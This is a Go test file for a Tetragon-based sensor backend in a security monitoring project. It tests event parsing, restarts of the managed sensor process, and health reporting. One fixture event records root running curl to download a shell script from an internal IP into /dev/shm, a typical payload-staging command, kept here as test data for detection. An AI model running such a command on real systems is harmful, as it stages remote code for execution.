package tetragon

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	eventv1 "github.com/sysarmor/sysarmor-next-project/api/proto/event/v1"
	"github.com/sysarmor/sysarmor-next-project/internal/sensor/contract"
)

func TestBackendSubscribesJSONLFile(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("apiVersion: cilium.io/v1alpha1\nkind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	eventPath := filepath.Join(dir, "events.jsonl")
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	if err := os.WriteFile(eventPath, []byte(raw+"\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{ObserveOnly: true})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []eventv1.EventKind
	for ev := range events {
		if ev.RawRef == "" || ev.SensorEvent.GetRawRef() == "" {
			t.Fatalf("raw ref was not populated: %+v", ev)
		}
		got = append(got, ev.SensorEvent.GetKind())
	}
	if len(got) != 2 || got[0] != eventv1.EventKind_EVENT_KIND_EXEC || got[1] != eventv1.EventKind_EVENT_KIND_WRITE {
		t.Fatalf("got kinds %v, want EXEC, WRITE", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if !health.PolicyLoaded || health.EventsSeen != 2 {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendManagedEventCommandSubscribesStdout(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed event command test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	script := "#!/bin/sh\nprintf '%s\\n' '" + raw + "'\n"
	if err := os.WriteFile(tetraPath, []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	tetragonPath := filepath.Join(dir, "tetragon")
	if err := os.WriteFile(tetragonPath, []byte("#!/bin/sh\nsleep 5\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithBundle(policyPath, "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath})
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	var got []eventv1.EventKind
	for ev := range events {
		got = append(got, ev.SensorEvent.GetKind())
	}
	if len(got) != 1 || got[0] != eventv1.EventKind_EVENT_KIND_EXEC {
		t.Fatalf("got kinds %v, want EXEC", got)
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.RestartCount != 2 || health.LastExitReason == "" {
		t.Fatalf("health = %+v", health)
	}
}

func TestBackendRestartsManagedSensorProcess(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("managed sensor restart test requires /bin/sh")
	}
	if _, err := os.Stat("/bin/sh"); err != nil {
		t.Skip("/bin/sh is unavailable")
	}
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	countPath := filepath.Join(dir, "count")
	tetragonPath := filepath.Join(dir, "tetragon")
	tetragonScript := "#!/bin/sh\nCOUNT='" + countPath + "'\nn=0\nif [ -f \"$COUNT\" ]; then n=$(cat \"$COUNT\"); fi\nn=$((n+1))\nprintf '%s' \"$n\" > \"$COUNT\"\nexit 7\n"
	if err := os.WriteFile(tetragonPath, []byte(tetragonScript), 0o755); err != nil {
		t.Fatal(err)
	}
	raw := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:00Z"},"parent":{"pid":99,"binary":"/sbin/init","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
	tetraPath := filepath.Join(dir, "tetra")
	tetraScript := "#!/bin/sh\nsleep 0.2\nprintf '%s\\n' '" + raw + "'\n"
	if err := os.WriteFile(tetraPath, []byte(tetraScript), 0o755); err != nil {
		t.Fatal(err)
	}
	backend := NewBackendWithOptions(policyPath, "", "test", BundleConfig{TetraPath: tetraPath, TetragonPath: tetragonPath}, ProcessRestartPolicy{
		Enabled:     true,
		MaxRestarts: 3,
		Delay:       10 * time.Millisecond,
	})
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	for range events {
	}
	waitForBackendHealth(t, backend, func(health contract.Health) bool {
		return health.RestartCount >= 4 && strings.Contains(health.LastExitReason, "exit status 7")
	})
	data, err := os.ReadFile(countPath)
	if err != nil {
		t.Fatalf("ReadFile(count) error = %v", err)
	}
	if string(data) != "3" {
		t.Fatalf("managed sensor restart count file = %q, want 3", string(data))
	}
}

func TestBackendRequiresPolicy(t *testing.T) {
	backend := NewBackend(filepath.Join(t.TempDir(), "missing.yaml"), "-", "test")
	if _, err := backend.Subscribe(context.Background(), contract.CollectionIntent{}); err == nil {
		t.Fatal("Subscribe() error = nil")
	}
}

func TestBackendRecordsParseErrors(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	eventPath := filepath.Join(dir, "events.jsonl")
	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(eventPath, []byte("{bad-json}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	backend := NewBackend(policyPath, eventPath, "test")
	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
	if err != nil {
		t.Fatalf("Subscribe() error = %v", err)
	}
	select {
	case _, ok := <-events:
		if ok {
			t.Fatal("unexpected event")
		}
	case <-time.After(time.Second):
		t.Fatal("timed out waiting for closed events")
	}
	health, err := backend.Health(context.Background())
	if err != nil {
		t.Fatalf("Health() error = %v", err)
	}
	if health.ParseErrors != 1 {
		t.Fatalf("ParseErrors = %d", health.ParseErrors)
	}
}

func waitForBackendHealth(t *testing.T, backend *Backend, done func(contract.Health) bool) {
	t.Helper()
	deadline := time.Now().Add(time.Second)
	var last contract.Health
	for time.Now().Before(deadline) {
		health, err := backend.Health(context.Background())
		if err != nil {
			t.Fatalf("Health() error = %v", err)
		}
		last = health
		if done(health) {
			return
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for backend health, last = %+v", last)
}
